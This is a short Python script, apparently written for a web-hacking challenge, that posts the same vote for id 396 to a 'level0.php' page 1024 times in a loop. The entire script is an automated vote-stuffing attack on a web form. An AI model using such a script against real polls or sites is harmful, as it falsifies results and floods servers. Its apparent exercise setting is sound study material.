#!/usr/bin/python3

import time
import requests

payload = {'id': '396', 'holdthedoor': 'submit'}  # data that we want to upload

for i in range(0, 1024):  # voting 1024 times
    r = requests.post("http://158.69.76.135/level0.php", data=payload)
    if r.status_code != 200:
        print("post #{} has failed".format(i))
